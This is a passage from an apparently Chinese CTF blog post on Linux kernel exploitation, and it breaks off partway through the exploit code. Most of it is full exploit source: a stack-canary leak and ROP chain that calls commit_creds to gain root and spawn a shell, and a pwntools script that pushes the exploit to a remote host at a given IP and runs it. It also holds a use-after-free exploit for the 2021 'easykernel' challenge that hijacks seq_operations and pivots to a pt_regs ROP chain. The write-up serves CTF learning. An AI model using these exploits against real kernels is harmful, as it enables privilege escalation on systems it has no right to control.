class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00f50</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>        <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>        &#123;<br>            vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;  <br>    &#125;<br>     <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">void</span> (*cc)(<span class="hljs-type">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span>&#123;<br>    saveStatus();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base<span class="hljs-number">-0x30350</span>;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/dev/test&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        errExit(<span class="hljs-string">&quot;open ko err&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    read(fd, buf,<span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">//printf(&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;,canary);</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">4</span>;i++)<br>        rop[i] = canary;<br><br>    rop[i++] = (<span class="hljs-type">size_t</span>)&amp;get_root;<br><br>    rop[i++] = swapgs_restore_regs_and_return_to_usermode+offset+<span class="hljs-number">22</span>;<br>    rop[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    rop[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    <span class="hljs-comment">//rop[i++] = 0;</span><br><br>    rop[i++] = (<span class="hljs-type">size_t</span>)&amp;spawn_shell;         <span class="hljs-comment">// rip </span><br><br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br><br>    write(fd, rop, <span class="hljs-number">0x300</span>);<br>    ioctl(fd,<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="0x5传远端">0x5传远端</h4><p>只有<code>/tmp</code>目录下可以生成文件好像，</p><p>放一张当时打通的图</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/12-1684501192455.png" alt="12"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time, os<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#p = process(&#x27;./boot.sh&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;223.112.5.156&quot;</span>,<span class="hljs-number">60870</span>)<br><br>os.system(<span class="hljs-string">&quot;tar -czvf exp.tar.gz ./exploit&quot;</span>)<br>os.system(<span class="hljs-string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./b64_exp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br><br>p.sendline()<br>p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;echo &#x27;&#x27; &gt; /tmp/b64_exp;&quot;</span>)<br><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;now line: &#x27;</span> + <span class="hljs-built_in">str</span>(count))<br>    line = f.readline().replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line)&lt;=<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br>    cmd = <span class="hljs-string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="hljs-string">b&quot;&#x27; &gt;&gt; /tmp/b64_exp;&quot;</span><br>    p.sendline(cmd) <span class="hljs-comment"># send lines</span><br>    <span class="hljs-comment">#time.sleep(0.02)</span><br>    <span class="hljs-comment">#p.recv()</span><br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>    count += <span class="hljs-number">1</span><br>f.close()<br><br>p.sendline(<span class="hljs-string">&quot;base64 -d /tmp/b64_exp &gt; /tmp/exp.tar.gz;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;tar -xzvf /tmp/exp.tar.gz&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/tmp/exploit&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="2021西湖论剑线上赛easykernel">2021西湖论剑线上赛easykernel</h3><h4 id="0x1分析">0x1分析</h4><p>版本5.8.0,保护smep,kalsr,PTI</p><p>漏洞驱动，一个堆菜单，功能齐全</p><p>kfree参数为空很奇怪</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684500595851.png" alt="1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// /mm/slab.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *objp)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>trace_kfree(_RET_IP_, objp);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(objp)))<br><span class="hljs-keyword">return</span>;<br><span class="hljs-comment">//....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>源码中检查如果参数为NULL,直接return结束，什么都不做</p><p>这里应该是ida反汇编显示有点问题</p><p>汇编语句这里是赋值rdi为addrlist了，所以是有参数的，是个uaf</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684500595851.png" alt="2"></p><p>此外我自己实际测试下来是开启了Slub Freelist Hardened，fd被异或加密了</p><p>没法直接doublefree达成任意写</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3-1684500595851.png" alt="3"></p><h4 id="0x2-seq-pt-regs-ROP">0x2:seq+pt_regs+ROP</h4><p>1.制造0x20大小uaf，分配到seq结构体，泄露内核代码段地址</p><p>2.劫持seq_operations-&gt;start，栈迁移至内核栈pt_regs，执行我们布置好的rop链提权</p><h4 id="0x3Exp">0x3Exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82663300</span><br><span class="hljs-comment">//cat g2|grep &quot;: pop rdi ; ret$&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81089250</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><br><span class="hljs-type">int</span> fd,tty_fd=<span class="hljs-number">-1</span>,seq_fd=<span class="hljs-number">-1</span>;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">void</span> *kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode,init_cred,pop_rdi_ret,commit_creds,gadget;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">notearg</span>&#123;</span><br>    <span class="hljs-type">size_t</span> idx; <br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;Note;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span>&#123;</span><br>        <span class="hljs-type">size_t</span>  size;<br>        <span class="hljs-type">void</span>  *buf;<br>&#125;;<br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016lx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">void</span> *buf)</span>&#123; <br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x40</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">void</span> *buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x50</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    ioctl(fd,<span class="hljs-number">0x30</span>,&amp;idx);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span> <span class="hljs-title">ac</span>=</span>&#123;<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x20</span>,&amp;ac);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_kernel_base</span><span class="hljs-params">()</span>&#123;<br>    buf=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>    <span class="hljs-comment">//printf(&quot;%lx\n&quot;,buf);</span><br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x300</span>);<br>    add(<span class="hljs-number">0x20</span>,buf);<span class="hljs-comment">//0</span><br>    del(<span class="hljs-number">0</span>);<br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span>(seq_fd==<span class="hljs-number">-1</span>)&#123;<br>        errExit(<span class="hljs-string">&quot;seq&quot;</span>);<br>    &#125;<br>    show(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    Hexdump(buf,<span class="hljs-number">0x20</span>);<br>    kernel_offset=*(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(buf)<span class="hljs-number">-0x319D30</span><span class="hljs-number">-0xffffffff81000000</span>;<br>    commit_creds=kernel_offset+COMMIT_CREDS;<br>    init_cred=kernel_offset+INIT_CRED;<br>    swapgs_restore_regs_and_return_to_usermode=kernel_offset+SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    pop_rdi_ret=kernel_offset+POP_RDI_RET;<br>    gadget = <span class="hljs-number">0xffffffff8135b0f6</span> + kernel_offset;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B0F6                 add     rsp, 180h</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B0FD                 pop     rbx</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B0FE                 pop     r12</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B100                 pop     r13</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B102                 pop     r14</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B104                 pop     rbp</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B105                 retn</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] commit_creds: %p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] init_cred: %p\n&quot;</span>, init_cred);<br><br>    <span class="hljs-type">size_t</span> gdget[<span class="hljs-number">4</span>];<br>    gdget[<span class="hljs-number">0</span>]=gadget;<br>    swapgs_restore_regs_and_return_to_usermode += <span class="hljs-number">9</span>;<br>    edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, gdget);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_pt_regs_rop</span><span class="hljs-params">()</span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15, 0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, pop_rdi_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, init_cred;&quot;</span> <br>        <span class="hljs-string">&quot;mov r12, commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx, 0x999999999;&quot;</span><br>        <span class="hljs-string">&quot;mov r11, 0x114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r10, 0x666666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r9, 0x1919114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r8, 0xabcd1919810;&quot;</span><br>        <span class="hljs-string">&quot;xor rax, rax;&quot;</span>       <span class="hljs-comment">//read(seq_fd,&quot;rsp&quot;,8)</span><br>        <span class="hljs-string">&quot;mov rcx, 0x666666;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 8;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, rsp;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, seq_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>    system(<span 